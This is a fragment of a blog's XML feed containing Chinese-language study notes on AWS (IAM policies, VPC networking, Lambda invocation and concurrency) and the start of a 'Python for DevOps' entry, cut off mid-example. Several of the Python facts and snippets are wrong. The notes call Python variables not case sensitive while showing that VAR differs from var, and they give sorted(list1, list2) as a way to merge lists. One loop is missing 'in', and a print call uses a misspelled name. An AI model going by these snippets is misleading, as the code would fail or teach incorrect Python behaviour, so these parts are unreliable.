        <content type="html"><![CDATA[<h1 id="Regions-amp-AZs"><a href="#Regions-amp-AZs" class="headerlink" title="Regions &amp; AZs"></a>Regions &amp; AZs</h1><p><strong>Region</strong>: 一群橫跨多個不同地理位置的資料中心 Ex. <code>us-east-1</code></p><p><strong>Avaiable Zone(AZ)</strong>: 每個 Region 下都有多個相互隔離的位置叫做AZ，一個AZ中可能會有一個或多個資料中心，具有獨立的網路系統以及供電。 <code>us-east-1a</code>, <code>us-east-1b</code>….etc</p><p><strong>Local Zone</strong>: 沒有實體的資料中心，通常會連接到某個AZ, Ex.台灣Local Zone 就是接到 <code>ap-northeast-1</code>，旨在提供服務給 edge location 以降低延遲。</p><p><strong>AWS Outposts</strong>: 部署在客戶 On Premises 的實體伺服器，提供本地存取AWS服務</p><h1 id="IAM"><a href="#IAM" class="headerlink" title="IAM"></a>IAM</h1><p>在 AWS 環境中用於進行存取控制的服務。可以管理哪些使用者可以有權限存取哪些資源。</p><div class="note warning flat"><p><em>Security Best Practices: 不要用 Root User 來進行日常業務，請建立對應的 User 給與適當權限再進行業務</em></p></div><p>在 IAM 中下面是常見得術語和關係圖：<strong>IAM User</strong>, <strong>IAM Group</strong>, <strong>IAM Role</strong>, <strong>Permission policy</strong>, <strong>Identity-provider object</strong> 他們的關係圖如下。</p><p><img src="/img/devops/AWS/iam-terms-2.png"></p><p>不管是哪個 IAM 實體 (IAM User, IAM Role) 都需要有對應的 <strong>Policy</strong> 給他們權限，以下可以看 Policy 的結構</p><h2 id="IAM-Policy"><a href="#IAM-Policy" class="headerlink" title="IAM Policy"></a>IAM Policy</h2><p><em>exmaple policy</em></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;Version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2012-10-17&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Statement&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Sid&quot;</span><span class="punctuation">:</span> <span class="string">&quot;S3ConsoleAccess&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="string">&quot;s3:GetAccountPublicAccessBlock&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;s3:GetBucketAcl&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;s3:GetBucketLocation&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;s3:GetBucketPolicyStatus&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;s3:GetBucketPublicAccessBlock&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;s3:ListAccessPoints&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;s3:ListAllMyBuckets&quot;</span></span><br><span class="line">            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Sid&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ListObjectsInBucket&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;s3:ListBucket&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;arn:aws:s3:::amzn-s3-demo-bucket&quot;</span><span class="punctuation">]</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Sid&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AllObjectActions&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;s3:*Object&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;arn:aws:s3:::amzn-s3-demo-bucket/*&quot;</span><span class="punctuation">]</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><ul><li><code>Version</code> <ul><li>2012-10-17: 默認會是這個版本的政策語言</li><li>2008-10-17: 舊版本的政策語言</li></ul></li><li><code>Statement</code><ul><li>元素為多個 Policies，可以是自定義的或者是AWS Managed Policies</li></ul></li><li><code>Sid</code><ul><li>個別 policy statement 的ID，可以描述該Policy的行為</li></ul></li><li><code>Effect</code><ul><li><code>Allow</code>: 允許針對所列的 <code>resource</code> 去進行所列的 <code>action</code></li><li><code>Deny</code>: 拒絕針對所列的 <code>resource</code> 去進行所列的 <code>action</code></li></ul></li><li><code>Action</code><ul><li>他的格式為 <code>[服務名稱]:[可對該服務進行的API操作]</code></li><li>這邊的Action 也就是 Permission</li></ul></li><li><code>Resource</code><ul><li>通常會是資源的 ARN</li><li>也可以使用 wildcard <code>*</code></li><li>Example <code>&quot;Resource&quot;: &quot;arn:aws:s3:::amzn-s3-demo-bucket/*&quot;</code></li></ul></li><li><code>Condition</code><ul><li>用於指定讓政策生效時候的條件</li><li>Example. <code>&quot;Condition&quot; : &#123; &quot;StringEquals&quot; : &#123; &quot;aws:username&quot; : &quot;johndoe&quot; &#125;&#125;</code></li></ul></li></ul><blockquote><p><a href="https://docs.aws.amazon.com/zh_tw/service-authorization/latest/reference/reference_policies_actions-resources-contextkeys.html">AWS 服務的 Actions, Resource 以及 Conditions 列表</a><br><a href="https://docs.aws.amazon.com/zh_tw/aws-managed-policy/latest/reference/policy-list.html">AWS 受管政策</a> 某些好用的Policy 可以直接使用</p></blockquote><h2 id="IAM-工作原理"><a href="#IAM-工作原理" class="headerlink" title="IAM 工作原理"></a>IAM 工作原理</h2><blockquote><p> <a href="https://docs.aws.amazon.com/zh_tw/IAM/latest/UserGuide/intro-structure.html">https://docs.aws.amazon.com/zh_tw/IAM/latest/UserGuide/intro-structure.html</a></p></blockquote><p><img src="/img/devops/AWS/policy_flow.png"><br><em>圖源: AWS Developer Guide</em></p><p>使用者或應用程式會使用登入憑證(AWS或第三方)向AWS進行身份驗證。IAM 將登入認證跟受信任的主體做比對，若匹配則授權可以存取AWS資源，接著IAM 會請求接下來授予主體訪問資源的權限，然後 IAM 會根據 Policy 的規定來看 Allow 還是 Deny 主體對資源的權限。</p><h1 id="VPC"><a href="#VPC" class="headerlink" title="VPC"></a>VPC</h1><p><em>什麼是VPC?</em></p><p><img src="/img/devops/AWS/vpc.png"></p><p>一個 Regional 的資源，可以建立用於部署AWS服務的網域</p><p>Ex. </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CRDR: 10.0.0.0/16</span><br></pre></td></tr></table></figure><h2 id="Subnet"><a href="#Subnet" class="headerlink" title="Subnet"></a>Subnet</h2><p>在 VPC 中可以切分成子網(Subnet)，Subnet 會是 AZ 層級的資源</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CIDR: 10.0.0.0/24</span><br></pre></td></tr></table></figure><p>通常有分成 <strong>Public Subnet</strong> 以及 <strong>Private Subnet</strong>，正常如果沒有特別設定都會是 Private Subnet，除非有在 Route Table 中將 Default Route 設定成 Internet Gateway。另外如果像要讓 Private Subnet 中的資源可以存取到外部網路，就需要設置 NAT Gateway。</p><blockquote><p>Amazon VPC Quotas:<br>VPCs per region: 5 (Can limit increase)<br>Subnets per region: 200 (Can limit increase)<br>IPv4 CIDR blocks per VPC: 5 (up to 50) (Can limit increase)</p></blockquote><p><em>AWS 環境的 IP Address，有哪些是 Reserved IP?</em></p><p><code>x.x.x.0</code>: 子網的第一個IP，用於標示子網<br><code>x.x.x.1</code>: VPC Router<br><code>x.x.x.2</code>: DNS Server<br><code>x.x.x.3</code>:  保留用於 Future Use<br><code>x.x.x.255</code>: Broadcast (雖然在 VPC 中不支援 Broadcast)</p><h2 id="Network-ACL-amp-Security-Groups"><a href="#Network-ACL-amp-Security-Groups" class="headerlink" title="Network ACL &amp; Security Groups"></a>Network ACL &amp; Security Groups</h2><p><em>什麼是 Network ACL?</em></p><ul><li><strong>一種 Stateless 的防火牆</strong>，可以控制來源IP流量是否可以 <strong>進出子網</strong></li><li>Allow &#x2F; Deny rules</li><li>Inbound &#x2F; Outbound</li><li>ACL 可以被 attach 在 Subnet 層級</li><li>Rule 只包含 IP Rules</li></ul><p><em>什麼是 Security Group?</em></p><ul><li><strong>一種 Stateful 的防火牆</strong>，可以控制 <strong>進入 ENI 或是 EC2 instances</strong></li><li>Allow rules</li><li>可以指定 IP address, port, 協定</li><li>可以包含其他 Security Group</li></ul><h2 id="VPC-Flow-Logs"><a href="#VPC-Flow-Logs" class="headerlink" title="VPC Flow Logs"></a>VPC Flow Logs</h2><p><em>什麼是VPC Flow Log?</em></p><p>主要是可以用來判斷哪些來源IP的封包流進每個介面，使用者可以為 VPC, Subnet, 或者是網路介面建立Flow Log</p><p>也可以用來監控和針對連線問題進行 Troubleshooting，包含：</p><ul><li>Subnets to Internet</li><li>Subnets to Subnets</li><li>Internet to Subnets</li></ul><h2 id="VPC-Peering"><a href="#VPC-Peering" class="headerlink" title="VPC Peering"></a>VPC Peering</h2><p>VPC Peering 可以用來讓不同的VPC之間建立私人連線，<strong>但前提是兩個VPC的 CIDR 不能夠重疊</strong>。 </p><p>另外值得注意的是，VPC Peering 並不是 Transitive 的。舉例來說，VPC_A 與 VPC_B Peering，而 VPC_B 與 VPC_C Peering，不代表 VPC_A 與 VPC_C 也能夠相互存取到。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">VPC_A &lt;---&gt; VPC_B</span><br><span class="line">VPC_B &lt;---&gt; VPC_C</span><br><span class="line">VPC_A &lt;-x-&gt; VPC_C</span><br></pre></td></tr></table></figure><h2 id="VPC-Endpoints"><a href="#VPC-Endpoints" class="headerlink" title="VPC Endpoints"></a>VPC Endpoints</h2><p>VPC Endpoint 主要可以讓不同服務相互存取而不用經過公共網路。 </p><p><em>Gateway Engpoint 以及 Interface Endpoint 之間的差異是什麼？</em></p><p>首先一樣回到 VPC Endpoint的原則，如果不用，那可能要讓請求流經公共網路。如果今天在一個 Public Subnet 的 EC2 想要存取 S3 bucket，那這樣請求本身就會透過 Internet Gateway 並流經由外部網路再到S3。</p><p><img src="/img/devops/AWS/without-gateway-endpoints.png"></p><p>或者另一種方式就是透過 VPC Endpoint 來存取，<strong>而用於存取 S3 和 DynamoDB 的 VPC Endpoint 為 Gateway Endpoint</strong>，他的特點就是能夠讓子網中的服務透過路由的方式來存取S3 或 DynamoDB</p><p><img src="/img/devops/AWS/gateway-endpoints.png"></p><p>在建立過程中會需要選取子網的路由表，就會自動在所選路由表下新增這個 entry</p><table><thead><tr><th>Destination</th><th>Target</th></tr></thead><tbody><tr><td>prefix_list_id</td><td>gateway_endpoint_id</td></tr></tbody></table><p>而不同於 Gateway Endpoint，<strong>VPC Interface Endpoint 則可用於大部分的服務</strong>，主要差別在於，Interface Endpoint 可以整合 Security Group，並且支援自定義的 DNS 解析 (Private DNS Name)，但較貴。</p><blockquote><p><a href="https://docs.aws.amazon.com/vpc/latest/privatelink/gateway-endpoints.html">https://docs.aws.amazon.com/vpc/latest/privatelink/gateway-endpoints.html</a></p></blockquote><h1 id="EC2"><a href="#EC2" class="headerlink" title="EC2"></a>EC2</h1><h1 id="ELB"><a href="#ELB" class="headerlink" title="ELB"></a>ELB</h1><h1 id="Auto-Scaling-Group"><a href="#Auto-Scaling-Group" class="headerlink" title="Auto-Scaling Group"></a>Auto-Scaling Group</h1><h1 id="S3"><a href="#S3" class="headerlink" title="S3"></a>S3</h1><h1 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h1><h1 id="Route53"><a href="#Route53" class="headerlink" title="Route53"></a>Route53</h1><h1 id="Lambda"><a href="#Lambda" class="headerlink" title="Lambda"></a>Lambda</h1><p><img src="/img/devops/AWS/lambda.png"></p><ul><li><em>解釋一下什麼是 Lambda?</em></li></ul><p>Lambda 是一種 <strong>Event-Driven 的 Serverless 服務</strong>，跟可以自定義業務邏輯程式碼，來根據不同狀況去 Trigger 對其他服務的 invocation，同時也 <strong>支援同步和非同步請求</strong>，並且也有很高的擴展性，可以透過設定 <strong>resevered concurrency 來去預留一定數量的 Lambda 函數</strong>，以因應大量的API請求，在設定 resevered concurrency 的基礎下，還可以透過 <strong>provision concurrency 來去預熱 Lambda 函數</strong>-，預先執行 Lambda 環境初始化的過程，<strong>減少 cold start</strong>，這樣就可以進一步地降低延遲。</p><p>Lambda支援多種不同的 Runtime，像是 Python 3.11, Nodejs20, Java 17, Java8, Ruby…etc。也可以自定義 Runtime。</p><p>以Python 為例，需要把函數被觸發後的行為定義在 handler之中。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handler_name</span>(<span class="params">event, context</span>): </span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">return</span> some_value</span><br></pre></td></tr></table></figure><div class="note info flat"><p>可以透過 <a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/lambda-runtimes.html">這份文件</a> 來查看哪些 Runtime 之後會 deprecate，被棄用的 Runtime 還是可 trigger，但AWS並不會進行 security patch 或 maintanance，而如果被棄用的 Runtime如果遭受攻擊進而影響到AWS基礎設施，根據 Shared Responsibility 那AWS有權利凍結用戶的函數，因此就是四個字: 後果自負~</p></div><ul><li><em>有哪些方式可以建立Lambda 函數?</em></li></ul><p>可以上傳 zip 檔，或者是使用 blueprint，另外也可以用 <strong>container image 的方式來建立。</strong>  但要特別注意的是如果要打包 image，<strong>最好要能夠在 Amazon Linux 的環境上打包</strong>，有時候如果跑的應用會牽扯到底層得某些 system calls 的時候，那可能就會出現錯誤，畢竟 Lambda 本身其實也是運行 Amazon Linux 的 EC2。</p><ul><li><em>由於 Lambda 的本身的VPC是由AWS管理的，如他讓他連接到其他自定義的VPC?</em></li></ul><p>首先要做的就是一定要確保 Lambda 的 Execution Role 具有 <strong><a href="https://docs.aws.amazon.com/aws-managed-policy/latest/reference/AWSLambdaVPCAccessExecutionRole.html">AWSLambdaVPCAccessExecutionRole</a></strong> 這個權限，有這個權限才能在Lambda 建立的時候也建立 Hyper ENI，他可以作為 Lambda 函數和目標資源之間得網路介面。</p><ul><li><em>同步與非同步調用 Lambda 函數主要差異在哪？</em></li></ul><p><img src="/img/devops/AWS/invocation.png"></p><p>主要差異在於是否回立刻回應，同步調用的時候，如果成功會立刻收到 Response，而非同步調用由於請求會在 Event Queue 中等待 Lambda 的 Poller 去poll訊息消費，因此客戶端在非同步調用時收到的可能就 <code>StatusCode: 202</code></p><p>這裡可以簡單透過 AWS CLI 去進行同步調用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">aws lambda invoke --function-name my-function \</span><br><span class="line">    --cli-binary-format raw-in-base64-out \</span><br><span class="line">    --payload &#x27;&#123; &quot;key&quot;: &quot;value&quot; &#125;&#x27; response.json</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果成功調用，收到的請求可能會長下面這樣</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;ExecutedVersion&quot;: &quot;$LATEST&quot;,</span><br><span class="line">    &quot;StatusCode&quot;: 200</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面這是透過 CLI 進行非同步調用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">aws lambda invoke \</span><br><span class="line">  --function-name my-function  \</span><br><span class="line">  --invocation-type Event \</span><br><span class="line">  --cli-binary-format raw-in-base64-out \</span><br><span class="line">  --payload &#x27;&#123; &quot;key&quot;: &quot;value&quot; &#125;&#x27; response.json </span><br></pre></td></tr></table></figure><p>若成功輸出則會是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;StatusCode&quot;: 202</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><em>Lambda 非同步調用要如何進行錯誤處理？</em></li></ul><p>Lambda 正常來說如果發生錯誤，會先 Retry 兩次，這通常也能夠在 Log 觀察到。如過錯誤原因是被 Throttled，則 Lambda 會將event 退回 event queue，並一樣還是會 retry <strong>但時間會是 backoff-exponential 成長</strong> 直到6小時。</p><p>或者也可以設置 <strong>Dead-Letter-Queue</strong>，通常是用來保留非同步調用的紀錄，也可以幫助近一步的排查。 DLQ 通常可以選擇 Amazon SQS 或者是 Amazon SNS Topic。</p><blockquote><p><a href="https://aws.amazon.com/tw/blogs/architecture/understanding-the-different-ways-to-invoke-lambda-functions/">https://aws.amazon.com/tw/blogs/architecture/understanding-the-different-ways-to-invoke-lambda-functions/</a></p></blockquote><h2 id="Reserved-Concurrency-amp-amp-Provision-Concureency"><a href="#Reserved-Concurrency-amp-amp-Provision-Concureency" class="headerlink" title="Reserved Concurrency &amp;&amp; Provision Concureency"></a>Reserved Concurrency &amp;&amp; Provision Concureency</h2><p>為了讓 Lambda Function 能夠進行 Auto-scaling，正常來說會建議設定 <strong>預留並行(Reserved concurrency)</strong> ，來讓 Lambda Function 隨時保持一定數量的函數來去處理請求。</p><blockquote><p>Reserved Concurrency 的數量上限為： 未預留帳戶的Concurrency 數量 -100<br>簡言之就是保留最少100個 Concurrency 在這個 Account上</p></blockquote><p><strong>佈建並行(Provision Concurrency)</strong> 則是指定這些預留函數中有多少個函數需要先預熱，這裡的預熱指的是，初始化 Lambda 的執行環境，像是載入 runtime，初始化變數等等，也會先執行在 handler 之外變數的初始化，這就代表初始化過程需要一次，然後執行環境就會被保留來快速回應之後的請求。</p><p><img src="/img/devops/AWS/reserved_c.png"></p><p>可以看上面AWS文件中的圖也有詳細說明，<strong>如果沒有設定 Provision Concurrency 則當Lambda terminate後每次新的請求進來都會需要再經歷一次 Lambda Init 階段。</strong></p><blockquote><p>Ref: </p><ol><li><a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/provisioned-concurrency.html#optimizing-latency">https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/provisioned-concurrency.html#optimizing-latency</a></li><li><a href="https://docs.aws.amazon.com/lambda/latest/dg/lambda-concurrency.html#reserved-and-provisioned">https://docs.aws.amazon.com/lambda/latest/dg/lambda-concurrency.html#reserved-and-provisioned</a></li></ol></blockquote><p><em>要如何計算出所需要的 Concurrency?</em></p><p>$Concurrency &#x3D; (average requests per second) \times (average request duration in seconds)$</p><p>每秒平均請求乘上平均請求的持續時間，可以用這種方式來粗略估計要多少 Concurrency，<strong>具體量測方法可以去看 Lambda Invocation Metrics 來查看每秒平均請求數，再透過 Duration 指標來預估平均請求持續的時間</strong></p><h1 id="API-Gateway"><a href="#API-Gateway" class="headerlink" title="API Gateway"></a>API Gateway</h1><h1 id="SNS-x2F-Pinpoint"><a href="#SNS-x2F-Pinpoint" class="headerlink" title="SNS &#x2F; Pinpoint"></a>SNS &#x2F; Pinpoint</h1><h1 id="SQS"><a href="#SQS" class="headerlink" title="SQS"></a>SQS</h1><h1 id="MQ"><a href="#MQ" class="headerlink" title="MQ"></a>MQ</h1><h1 id="Cloudformation"><a href="#Cloudformation" class="headerlink" title="Cloudformation"></a>Cloudformation</h1><h1 id="AWS-CDK"><a href="#AWS-CDK" class="headerlink" title="AWS CDK"></a>AWS CDK</h1><h1 id="ECS"><a href="#ECS" class="headerlink" title="ECS"></a>ECS</h1><h1 id="EKS"><a href="#EKS" class="headerlink" title="EKS"></a>EKS</h1><h1 id="Fargate"><a href="#Fargate" class="headerlink" title="Fargate"></a>Fargate</h1>]]></content>
      
      
      <categories>
          
          <category> 學習筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AWS </tag>
            
            <tag> Python </tag>
            
            <tag> DevOps </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python for DevOps 筆記 |【DevOps技能樹】</title>
      <link href="/posts/70fcdd32.html"/>
      <url>/posts/70fcdd32.html</url>
      
        <content type="html"><![CDATA[<h1 id="Basic-Data-Types"><a href="#Basic-Data-Types" class="headerlink" title="Basic Data Types"></a>Basic Data Types</h1><h2 id="data-type"><a href="#data-type" class="headerlink" title="data type"></a>data type</h2><ul><li>可以透過 <code>type()</code> 來獲取物件或變數的 data type</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; var = &quot;This is a string&quot;</span><br><span class="line">&gt;&gt;&gt; print(type(var))</span><br><span class="line">&lt;class &#x27;str&#x27;&gt;</span><br></pre></td></tr></table></figure><h2 id="Variables"><a href="#Variables" class="headerlink" title="Variables"></a>Variables</h2><ul><li><code>x</code> valid</li><li><code>x_y</code> valid</li><li><code>x-y</code> invalid</li><li>Python 變數並非 Case Sensitive<ul><li><code>VAR</code> 不等於 <code>var</code></li></ul></li><li>當你在輸入 <code>x=1</code> 的時候會發生什麼事？<ul><li>其實就是創造一個整數物件其value為1</li><li>因此會在記憶體中分配一個固定大小的位址用來存放 1</li><li>而 <code>x</code> 這個名稱會指向用於該物件的 reference</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; x =123</span><br><span class="line">&gt;&gt;&gt; y =x</span><br><span class="line">&gt;&gt;&gt; print(id(x))</span><br><span class="line">4298889392</span><br><span class="line">&gt;&gt;&gt; print(id(y))</span><br><span class="line">4298889392</span><br></pre></td></tr></table></figure><ul><li>在 Python 中，<strong>變數是對物件的引用，這意味著變數名稱指向記憶體中的物件，但變數本身並不包含記憶體位址</strong></li><li>所以當你把一個變數賦值給另一個變數時，兩者用的是相同的引用</li><li>多個變數若初始化的值一樣可以這樣宣告 <code>a = b = c = 1</code></li></ul><h2 id="Booleans"><a href="#Booleans" class="headerlink" title="Booleans"></a>Booleans</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bool(0), bool(), bool(&quot;&quot;) -&gt; False</span><br><span class="line">bool(1), bool(456), bool(&quot;Hello&quot;) -&gt; True</span><br></pre></td></tr></table></figure><h2 id="Strings"><a href="#Strings" class="headerlink" title="Strings"></a>Strings</h2><ul><li>How to convert “2 0 1 7” to the list [2, 0, 1, 7]?<ul><li><code>int(i) for i in &quot;2 0 1 7&quot;.split()</code></li></ul></li></ul><h2 id="Lists-amp-Tuples"><a href="#Lists-amp-Tuples" class="headerlink" title="Lists &amp; Tuples"></a>Lists &amp; Tuples</h2><ul><li><em>What is a tuple in Python? What is it used for?</em></li><li>Python 中的一種排序，並且不可更動的元素組合，<strong>簡單來說就是想在一個變數中包含多個item</strong></li><li>他跟 list 最大的差異在 tuple 一旦建立後，裡頭的值就不可更動</li><li><code>coordinates = (120.5, 23.5 )</code></li></ul><p>List Basic Operations</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; x = [1,2,3]</span><br><span class="line">&gt;&gt;&gt; y = [4,5,6]</span><br><span class="line">&gt;&gt;&gt; print(x[-1])</span><br><span class="line">3</span><br><span class="line">&gt;&gt;&gt; x.append(4)</span><br><span class="line">&gt;&gt;&gt; print(x)</span><br><span class="line">[1, 2, 3, 4]</span><br><span class="line">&gt;&gt;&gt; x[0:2] = []</span><br><span class="line">&gt;&gt;&gt; print(x)</span><br><span class="line">[3, 4]</span><br><span class="line">&gt;&gt;&gt; y.extend(x)</span><br><span class="line">&gt;&gt;&gt; print(y)</span><br><span class="line">[4, 5, 6, 3, 4]</span><br><span class="line">&gt;&gt;&gt; y.insert(0, 123)</span><br><span class="line">&gt;&gt;&gt; print(y)</span><br><span class="line">[123, 4, 5, 6, 3, 4]</span><br><span class="line">&gt;&gt;&gt; y.sort()</span><br><span class="line">&gt;&gt;&gt; print(y)</span><br><span class="line">[3, 4, 4, 5, 6, 123]</span><br><span class="line">&gt;&gt;&gt; y.sort(reverse=True)</span><br><span class="line">&gt;&gt;&gt; print(y)</span><br><span class="line">[123, 6, 5, 4, 4, 3]</span><br></pre></td></tr></table></figure><ul><li><em>如何迭代一個 List？</em></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">for item in list:</span><br><span class="line">    print(item)</span><br></pre></td></tr></table></figure><ul><li><em>如何透過 index 來迭代一個 list ?</em></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i , item <span class="keyword">in</span> <span class="built_in">enumerate</span>(<span class="built_in">list</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure><ul><li><em>如何反向迭代一個 list?</em></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="built_in">reversed</span>(<span class="built_in">list</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure><ul><li><em>如何將兩個已排序的 list 合併？</em>  <code>sorted(list1, list2)</code></li><li><em>什麼是 <strong>List Comprehension</strong> ?</em><ul><li>他是一種更加簡潔方便的做法來建立List</li><li>語法： <code>[expression for item in iterable if condition]</code></li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">squares = [x**<span class="number">2</span> <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)]</span><br><span class="line"><span class="built_in">print</span>(sqaures) </span><br><span class="line"><span class="comment">## Output  [0, 1, 4, 9, 16, 25, 36, 49, 64, 81]</span></span><br></pre></td></tr></table></figure><blockquote><p><a href="https://docs.python.org/3/tutorial/datastructures.html#list-comprehensions">https://docs.python.org/3/tutorial/datastructures.html#list-comprehensions</a></p></blockquote><h2 id="Dictionaries"><a href="#Dictionaries" class="headerlink" title="Dictionaries"></a>Dictionaries</h2><p><em>如何建立一個 Dictionaries ?</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; my_dict = dict(x=1, y=2)</span><br><span class="line">&gt;&gt;&gt; print(my_dict)</span><br><span class="line">&#123;&#x27;x&#x27;: 1, 